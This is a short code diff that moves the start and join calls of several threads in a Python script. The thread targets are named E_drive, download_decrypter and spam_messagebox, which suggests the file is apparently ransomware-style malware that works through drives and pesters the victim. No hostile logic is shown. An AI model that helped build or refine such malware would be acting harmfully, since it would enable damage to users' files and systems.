@@ -751,25 +751,25 @@ h = Thread(target = E_drive)
 download = Thread(target = download_decrypter)
 message = Thread(target = spam_messagebox)
 
-a.start()
-b.start()
 c.start()
 d.start()
 e.start()
 ff.start()
 g.start()
 h.start()
+a.start()
+b.start()
 
 
 
-a.join()
-b.join()
 c.join()
 d.join()
 e.join()
 ff.join()
 g.join()
 h.join()
+a.join()
+b.join()
 
 
 embed = {
